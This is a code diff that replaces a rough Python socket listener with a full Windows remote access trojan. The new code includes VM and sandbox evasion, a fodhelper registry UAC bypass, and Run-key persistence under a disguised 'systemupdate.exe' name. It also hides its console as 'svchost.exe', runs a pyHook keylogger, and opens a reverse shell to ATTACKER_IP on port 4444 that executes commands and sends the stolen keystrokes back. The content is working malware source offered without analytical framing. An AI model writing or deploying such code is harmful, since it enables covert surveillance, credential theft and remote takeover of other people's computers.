@@ -1,101 +1,115 @@
-import socket,os, time, threading, sys
-from queue import Queue
+import os
+import sys
+import subprocess
+import socket
+import threading
+import time
+import platform
+import ctypes
+import winreg
+import shutil
+import pythoncom
+import pyHook
+import win32event
+import win32api
+import win32con
+import getpass
+import psutil
+import random
 
-intThreads = 2
-arrJobs = [1,2]
-queue = Queue()
+ATTACKER_IP = '127.0.0.1'
+ATTACKER_PORT = 4444
+INSTALL_PATH = os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\systemupdate.exe'
+KEYLOG_FILE = os.path.expanduser('~') + '\\AppData\\Roaming\\Microsoft\\keys.txt'
+MUTEX_NAME = 'WindowsUpdateMutexEvil'
 
-arrAddresses = []
-arrConnections = []
+def is_vm():
+    suspicious = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen']
+    for proc in psutil.process_iter():
+        if any(vm in proc.name().lower() for vm in suspicious):
+            return True
+    return False
 
-strHost = "192.168.1.11"
-intPort = 4444
-
-intBuff = 1024
-
-decode_utf = lambda data: data.decode("utf-8")
-
-remove_quotes = lambda string: string.replace("\"","")
-
-send = lambda data: conn.send(data)
-
-recv = lambda buffer: conn.recv(buffer)
-
-def recvall(buffer):
-    bytData = b""
-    while True:
-        bytPart = recv(buffer)
-        if len (bytPart) == buffer:
-            return bytPart
-        bytData += bytPart
-
-        if len(bytData) == buffer:
-            return bytData
-        
-def create_socket():
-    global objSocket
+def uac_bypass():
     try:
-        objSocket = socket.socket()
-        objSocket.setsockopt(socket.SQL_SOCKET,socket.SO_REUSEADDR,1)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Classes\\ms-settings\\Shell\\Open\\command', 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, INSTALL_PATH)
+        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
+        winreg.CloseKey(key)
+        subprocess.call('fodhelper.exe', shell=True)
+        time.sleep(2)
+        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\\Classes\\ms-settings\\Shell\\Open\\command')
+    except:
+        pass
 
-    except socket.error() as strError:
-        print("Error creating socket"+str(strError))
+def add_persistence():
+    if not os.path.exists(INSTALL_PATH):
+        shutil.copy(sys.executable if getattr(sys, 'frozen', False) else sys.argv[0], INSTALL_PATH)
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, 'SystemUpdate', 0, winreg.REG_SZ, INSTALL_PATH)
+    winreg.CloseKey(key)
+    uac_bypass()
 
-def socket_bind():
-    global objSocket
-    try:
-        print("Listening on port:"+ str(intPort))
-        objSocket.bind((strHost,intPort))
-        objSocket.Listen(20)
+def hide_console():
+    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+    if hwnd:
+        ctypes.windll.user32.ShowWindow(hwnd, 0)
+    ctypes.windll.kernel32.SetConsoleTitleW('svchost.exe')
 
-    except socket.error() as strError:
-        print("Error binding socket "+str(strError))
-        socket_bind()
-
-def socket_accept():
-    while True:
-        try:
-            conn, address = objSocket.accept()
-            conn.setblocking(1) #no timeout
-            arrConnections.append(conn)
-            client_info = decode_utf(conn.recv(intBuff)).split("',")
-
-            address += client_info[0], client_info[1], client_info[2]
-            arrAddresses.append(address)
-            print("\n"+"Connection has been established : {0} ({1})".format(address[0],address[2]))
-
-        except socket.error:
-            print("Error accepting connections!")
-            continue
-
-
-    
-    #multithreading
-
-def create_threads():
-    for _ in range(intThreads):
-        objThread = threading.Thread()
-
-def work():
-    while True:
-        intValue = queue.get()
-        if intValue == 1:
-            create_socket()
-            socket_bind()
-            socket_accept()
-
-        elif intValue == 2:
-            while True:
-                time.sleep(0.2)
-                if len(arrAddresses) > 0:
-                    #main_menu()
-                    break
-
-
-        queue.task_done()
-        queue.task_done()
+def anti_analysis():
+    if is_vm() or 'sandbox' in getpass.getuser().lower():
+        sys.exit(0)
+    mutex = win32event.CreateMutex(None, False, MUTEX_NAME)
+    if win32api.GetLastError() == win32con.ERROR_ALREADY_EXISTS:
         sys.exit(0)
 
+def keylogger():
+    def on_keyboard(event):
+        with open(KEYLOG_FILE, 'a') as f:
+            f.write(chr(event.Ascii) if event.Ascii else f'[{event.Key}]')
+        return True
+    hm = pyHook.HookManager()
+    hm.KeyDown = on_keyboard
+    hm.HookKeyboard()
+    pythoncom.PumpMessages()
 
+def reverse_shell():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try:
+            s.connect((ATTACKER_IP, ATTACKER_PORT))
+            break
+        except:
+            time.sleep(random.randint(5, 15))
+    while True:
+        try:
+            data = s.recv(2048).decode()
+            if data == 'exit':
+                break
+            elif data.startswith('cd '):
+                os.chdir(data[3:])
+                s.send(b'Changed dir.\n')
+            elif data == 'keylog':
+                with open(KEYLOG_FILE, 'rb') as f:
+                    s.send(f.read())
+            else:
+                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output = proc.stdout.read() + proc.stderr.read()
+                s.send(output if output else b'No output.')
+        except Exception as e:
+            s.send(str(e).encode())
+    s.close()
 
+def install_and_run():
+    anti_analysis()
+    add_persistence()
+    hide_console()
+    threading.Thread(target=keylogger, daemon=True).start()
+    threading.Thread(target=reverse_shell, daemon=True).start()
 
+if __name__ == '__main__':
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        uac_bypass()
+    install_and_run()
+    while True:
+        time.sleep(100)
